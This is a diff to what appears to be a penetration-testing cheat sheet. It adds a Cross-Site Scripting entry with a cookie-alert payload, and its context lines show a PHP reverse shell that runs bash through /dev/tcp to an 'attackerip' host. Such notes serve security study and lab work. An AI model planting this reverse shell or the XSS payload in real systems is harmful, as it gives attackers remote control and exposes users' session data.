@@ -15,6 +15,7 @@
 - [FTP](#ftp) 
 - [Cewl](#cewl) - It is use to create a worldlist using website link
 - [netcat](#nc)
+- [Cross-Site Scripting](#xxs)
 
 
 # Enumeration
@@ -127,6 +128,12 @@
 <?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
 ?>
+```
+
+
+- ## Cross-Site Scripting <a name="xxs"></a>
+```js
+<script>alert(document.cookie)</script>
 ```
 
 
